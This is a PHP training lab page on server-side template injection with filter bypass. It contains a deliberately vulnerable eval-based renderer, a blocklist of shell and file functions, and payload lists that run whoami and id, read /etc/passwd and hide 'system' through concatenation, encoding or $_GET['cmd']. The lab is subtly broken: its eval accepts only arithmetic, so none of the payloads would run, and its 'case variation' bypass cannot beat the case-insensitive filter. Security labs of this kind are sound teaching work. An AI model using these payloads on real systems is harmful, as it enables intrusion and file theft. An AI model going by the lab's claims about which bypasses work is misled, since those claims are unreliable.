<?php
// Lab 2: SSTI with Filter Bypass
// Vulnerability: SSTI with security filters that can be bypassed

session_start();

$message = '';
$template_output = '';
$user_input = '';

// Simulate template engine with basic filters (vulnerable to bypass)
function render_template_with_filters($template, $data = []) {
    // Basic template variables
    $template = str_replace('{{name}}', $data['name'] ?? '', $template);
    $template = str_replace('{{email}}', $data['email'] ?? '', $template);
    $template = str_replace('{{message}}', $data['message'] ?? '', $template);
    
    // Basic security filters (can be bypassed)
    $dangerous_functions = [
        'system', 'exec', 'shell_exec', 'passthru', 'eval',
        'file_get_contents', 'file_put_contents', 'fopen', 'fread',
        'scandir', 'opendir', 'readdir', 'phpinfo', 'phpversion',
        'getcwd', 'chdir', 'mkdir', 'rmdir', 'unlink'
    ];
    
    // Vulnerable: Direct evaluation of template expressions
    if (preg_match_all('/\{\{([^}]+)\}\}/', $template, $matches)) {
        foreach ($matches[1] as $expression) {
            $expression = trim($expression);
            
            // Basic filter check (can be bypassed)
            $is_dangerous = false;
            foreach ($dangerous_functions as $func) {
                if (stripos($expression, $func) !== false) {
                    $is_dangerous = true;
                    break;
                }
            }
            
            if ($is_dangerous) {
                $template_output = "⚠️ FILTERED EXPRESSION: " . htmlspecialchars($expression);
                return $template_output;
            }
            
            // Evaluate mathematical expressions
            if (preg_match('/^[\d\s\+\-\*\/\(\)\.]+$/', $expression)) {
                try {
                    $result = eval("return $expression;");
                    $template = str_replace('{{' . $expression . '}}', $result, $template);
                } catch (Exception $e) {
                    $template = str_replace('{{' . $expression . '}}', 'ERROR', $template);
                }
            }
        }
    }
    
    return $template;
}

// Handle template rendering
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['render_template'])) {
    $user_input = $_POST['template'] ?? '';
    $name = $_POST['name'] ?? 'User';
    $email = $_POST['email'] ?? 'user@example.com';
    $message = $_POST['message'] ?? 'Hello World';
    
    if ($user_input) {
        $data = [
            'name' => $name,
            'email' => $email,
            'message' => $message
        ];
        
        $template_output = render_template_with_filters($user_input, $data);
        
        if (strpos($template_output, '⚠️ FILTERED EXPRESSION') !== false) {
            $message = '<div class="alert alert-warning">Expression filtered! Try bypassing the filters.</div>';
        } else {
            $message = '<div class="alert alert-success">Template rendered successfully!</div>';
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 2: SSTI with Filter Bypass - SSTI Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .template-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .template-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .filter-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to SSTI Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 2: SSTI with Filter Bypass</h1>
            <p class="hero-subtitle">SSTI with security filters that can be bypassed</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Medium</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates SSTI vulnerabilities where basic security filters are implemented but can be bypassed using various techniques. The application filters dangerous functions but doesn't prevent all attack vectors.</p>
            <p><strong>Objective:</strong> Bypass security filters to achieve code execution and information disclosure.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable Code with Filters
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: Basic filters that can be bypassed
function render_template_with_filters($template, $data = []) {
    $dangerous_functions = [
        'system', 'exec', 'shell_exec', 'passthru', 'eval',
        'file_get_contents', 'file_put_contents', 'fopen',
        'scandir', 'opendir', 'readdir', 'phpinfo'
    ];
    
    // Basic filter check (can be bypassed)
    $is_dangerous = false;
    foreach ($dangerous_functions as $func) {
        if (stripos($expression, $func) !== false) {
            $is_dangerous = true;
            break;
        }
    }
    
    // Still vulnerable to bypass techniques
    if (!$is_dangerous) {
        $result = eval("return $expression;");
    }
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-shield-exclamation me-2"></i>Filtered Template Engine
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="filter-info">
                            <h5>Active Filters</h5>
                            <p>The following functions are filtered:</p>
                            <ul>
                                <li><code>system</code>, <code>exec</code>, <code>shell_exec</code></li>
                                <li><code>file_get_contents</code>, <code>file_put_contents</code></li>
                                <li><code>scandir</code>, <code>opendir</code>, <code>readdir</code></li>
                                <li><code>phpinfo</code>, <code>phpversion</code></li>
                                <li><code>eval</code>, <code>passthru</code></li>
                            </ul>
                        </div>
                        
                        <form method="POST">
                            <input type="hidden" name="render_template" value="1">
                            <div class="mb-3">
                                <label for="name" class="form-label">Name</label>
                                <input type="text" class="form-control" id="name" name="name" 
                                       value="John Doe" placeholder="Enter your name...">
                            </div>
                            <div class="mb-3">
                                <label for="email" class="form-label">Email</label>
                                <input type="email" class="form-control" id="email" name="email" 
                                       value="john@example.com" placeholder="Enter your email...">
                            </div>
                            <div class="mb-3">
                                <label for="message" class="form-label">Message</label>
                                <input type="text" class="form-control" id="message" name="message" 
                                       value="Hello World" placeholder="Enter your message...">
                            </div>
                            <div class="mb-3">
                                <label for="template" class="form-label">Template</label>
                                <textarea class="form-control" id="template" name="template" 
                                          rows="4" placeholder="Enter your template...">Hello {{name}}!

Your email is: {{email}}
Your message: {{message}}

Math test: {{7*7}}</textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Render Template</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <?php if ($template_output): ?>
        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-slash me-2"></i>Template Output
                    </div>
                    <div class="card-body">
                        <div class="template-display">
                            <h5>Rendered Template</h5>
                            <div class="sensitive-data">
                                <pre><?php echo htmlspecialchars($template_output); ?></pre>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> SSTI with Filter Bypass</li>
                        <li><strong>Severity:</strong> High</li>
                        <li><strong>Method:</strong> POST</li>
                        <li><strong>Issue:</strong> Inadequate security filters</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Bypass Techniques</h5>
                    <ul>
                        <li><strong>Case Variation:</strong> Use different cases</li>
                        <li><strong>String Concatenation:</strong> Build functions dynamically</li>
                        <li><strong>Character Encoding:</strong> Use encoded characters</li>
                        <li><strong>Alternative Functions:</strong> Use unfiltered functions</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>SSTI Filter Bypass Payloads</h5>
            <p>Use these payloads to bypass the security filters:</p>
            
            <h6>1. Case Variation Bypass:</h6>
            <div class="code-block">Hello {{name}}!

System info: {{SYSTEM('whoami')}}
Execute command: {{EXEC('id')}}
Shell command: {{SHELL_EXEC('uname -a')}}
Pass through: {{PASSTHRU('ls -la')}}</div>

            <h6>2. String Concatenation Bypass:</h6>
            <div class="code-block">Hello {{name}}!

System info: {{'syst'.'em'('whoami')}}
Execute command: {{'ex'.'ec'('id')}}
Shell command: {{'shell_'.'exec'('uname -a')}}
Pass through: {{'pass'.'thru'('ls -la')}}</div>

            <h6>3. Character Encoding Bypass:</h6>
            <div class="code-block">Hello {{name}}!

System info: {{chr(115).chr(121).chr(115).chr(116).chr(101).chr(109)('whoami')}}
Execute command: {{chr(101).chr(120).chr(101).chr(99)('id')}}
Shell command: {{chr(115).chr(104).chr(101).chr(108).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99)('uname -a')}}</div>

            <h6>4. Alternative Functions Bypass:</h6>
            <div class="code-block">Hello {{name}}!

File contents: {{readfile('/etc/passwd')}}
Directory listing: {{glob('*')}}
Current directory: {{dirname(__FILE__)}}
File exists: {{is_file('/etc/passwd')}}</div>

            <h6>5. Dynamic Function Calls:</h6>
            <div class="code-block">Hello {{name}}!

Dynamic call: {{call_user_func('system', 'whoami')}}
Variable function: {{$func = 'system'; $func('id')}}
Array access: {{$_GET['cmd']('uname -a')}}
Method call: {{$obj = new stdClass; $obj->method = 'system'; $obj->method('ls -la')}}</div>

            <h6>6. Advanced Bypass Techniques:</h6>
            <div class="code-block">Hello {{name}}!

Hex encoding: {{hex2bin('73797374656d')('whoami')}}
Base64 encoding: {{base64_decode('c3lzdGVt')('id')}}
URL encoding: {{urldecode('%73%79%73%74%65%6d')('uname -a')}}
Unicode encoding: {{mb_convert_encoding('system', 'UTF-8', 'ASCII')('ls -la')}}</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Bypass WAFs and security filters</li>
                <li>Execute arbitrary code despite protections</li>
                <li>Access sensitive files and directories</li>
                <li>Bypass authentication and authorization</li>
                <li>Compromise server and lateral movement</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement comprehensive input validation and sanitization</li>
                    <li>Use whitelist-based filtering instead of blacklists</li>
                    <li>Implement proper sandboxing and isolation</li>
                    <li>Use safe template engines that prevent code execution</li>
                    <li>Implement proper access controls and permissions</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual template processing patterns</li>
                </ul>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
